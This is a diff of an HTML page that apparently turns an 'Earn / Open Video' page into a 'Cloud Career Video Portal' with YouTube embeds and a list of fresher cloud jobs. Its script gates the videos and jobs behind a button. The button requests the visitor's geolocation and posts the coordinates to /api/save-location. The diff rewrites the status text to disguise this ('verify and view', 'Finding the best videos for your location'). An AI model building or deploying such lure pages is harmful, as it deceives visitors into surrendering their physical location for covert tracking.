@@ -1,27 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Earn</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cloud Career Videos</title>
   <style>
     body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f6fc;
+      color: #333;
+    }
+
+    header {
+      background-color: #007bff;
+      color: white;
+      padding: 20px;
       text-align: center;
-      font-family: sans-serif;
-      padding: 50px;
-      background: #f4f4f4;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    main {
+      max-width: 900px;
+      margin: 40px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    h1 {
+      margin: 0;
     }
 
     button {
-      padding: 12px 24px;
+      padding: 12px 28px;
       background-color: #007bff;
       color: white;
       font-size: 16px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      margin-top: 20px;
     }
 
     button:hover {
       background-color: #0056b3;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-weight: 500;
+      color: #444;
     }
 
     #videoContainer {
@@ -29,31 +60,93 @@
       margin-top: 40px;
     }
 
-    iframe {
+    .video-card {
+      margin-bottom: 40px;
+    }
+
+    .video-title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .video-frame {
       border: none;
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
       width: 100%;
-      max-width: 720px;
+      max-width: 100%;
       height: 405px;
     }
 
-    #status {
-      margin-top: 20px;
-      font-weight: bold;
+    footer {
+      margin-top: 60px;
+      text-align: center;
+      color: #777;
+      font-size: 14px;
+    }
+
+    @media screen and (max-width: 768px) {
+      .video-frame {
+        height: 250px;
+      }
     }
   </style>
 </head>
 <body>
-  <h2>Open  Video</h2>
-  <p>Please by clicking below:</p>
-  <button onclick="shareLocation()">Open</button>
-  <p id="status"></p>
 
-  <div id="videoContainer">
-    <h3>🎥 Top Cloud Jobs with Highest Packages</h3>
-    <iframe id="ytFrame" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+  <header>
+    <h1>☁️ Cloud Career Video Portal</h1>
+  </header>
+
+  <main>
+    <h2>Watch Cloud Job Insights</h2>
+    <p>Click below to verify  and view career videos.</p>
+    <button onclick="shareLocation()">Open</button>
+    <p id="status"></p>
+    
+
+    <div id="videoContainer">
+      <div class="video-card">
+        <div class="video-title">🎥 Highest Paying Cloud Jobs</div>
+        <iframe class="video-frame" id="ytFrame1" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      </div>
+      <div class="video-card">
+        <div class="video-title">💼 How to Start Cloud Career (AWS, Azure)</div>
+        <iframe class="video-frame" id="ytFrame2" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      </div>
+    </div>
+    <div id="jobsContainer" style="display:none; max-width:700px; margin:40px auto 0; background:#f9fbff; border-radius:10px; box-shadow:0 2px 12px rgba(0,0,0,0.07); padding:24px;">
+  <h2 style="color:#007bff;">Cloud Engineer Fresher Near by Job List</h2>
+  <ul style="text-align:left;">
+    <li>Junior Cloud Engineer – Azure (Remote) <b>(CloudifyX Pvt Ltd)</b></li>
+    <li>Cloud Support Associate – AWS <b>(SkyNet Solutions)</b></li>
+    <li>Cloud Operations Trainee – Google Cloud <b>(Nimbus Tech)</b></li>
+    <li>DevOps Intern – Cloud Platform <b>(CloudNest)</b></li>
+    <li>Cloud Migration Assistant – Entry Level <b>(CloudBridge)</b></li>
+    <li>Cloud Security Analyst – Fresher <b>(SecureClouds)</b></li>
+    <li>Cloud Automation Trainee <b>(AutoCloud Systems)</b></li>
+    <li>Cloud Monitoring Executive – Fresher <b>(CloudWatchers)</b></li>
+    <li>Cloud Solutions Intern <b>(CloudGenix)</b></li>
+    <li>Cloud Infrastructure Trainee <b>(InfraCloud)</b></li>
+  </ul>
+  <h3 style="color:#007bff;">Steps to Get a Cloud Engineer Job (Fresher)</h3>
+  <ol style="text-align:left;">
+    <li>Learn Basics: Cloud fundamentals (AWS, Azure, GCP), Linux basics, networking.</li>
+    <li>Get Certified: AWS Cloud Practitioner, Azure Fundamentals, Google Cloud Digital Leader.</li>
+    <li>Build Projects: Deploy a website on cloud, set up a VM, automate tasks with scripts.</li>
+    <li>Create Resume: Highlight cloud skills, certifications, and projects.</li>
+    <li>Apply Online: Use LinkedIn, Naukri, Indeed, company career pages.</li>
+    <li>Prepare for Interview: Practice cloud basics, scenario-based questions, and troubleshooting.</li>
+    <li>Join Communities: LinkedIn groups, Discord servers, local meetups.</li>
+  </ol>
   </div>
+
+  </main>
+
+  <footer>
+    &copy; 2025 CloudCareer.ai | All rights reserved
+  </footer>
 
   <script>
     function shareLocation() {
@@ -62,7 +155,7 @@
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
 
-          document.getElementById('status').innerText = "Sending location...";
+          document.getElementById('status').innerText = "Finding the best videos for your location...";
 
           fetch('/api/save-location', {
             method: 'POST',
@@ -75,12 +168,17 @@
           })
           .then(res => res.json())
           .then(data => {
-            document.getElementById('status').innerText = "✅ Fetch  successfully.";
+            document.getElementById('status').innerText = "✅  saved. Videos unlocked.";
 
-            // Show video iframe
-            const ytURL = "https://www.youtube.com/embed/X5qoqwoJrrc"; // Your YouTube video in embed format
-            document.getElementById('ytFrame').src = ytURL;
-            document.getElementById('videoContainer').style.display = 'block';
+            // Set YouTube video URLs
+            const ytURL1 = "https://www.youtube.com/embed/X5qoqwoJrrc";
+            const ytURL2 = "https://www.youtube.com/embed/E-bNlmja0j8?si=gl1IsycLAxNDZexy";
+
+            document.getElementById('ytFrame1').src = ytURL1;
+            document.getElementById('ytFrame2').src = ytURL2;
+
+document.getElementById('videoContainer').style.display = 'block';
+document.getElementById('jobsContainer').style.display = 'block'; // 👈 This line shows the job list
           });
         }, function () {
           alert("❌ Location permission denied.");
@@ -90,5 +188,6 @@
       }
     }
   </script>
+
 </body>
 </html>
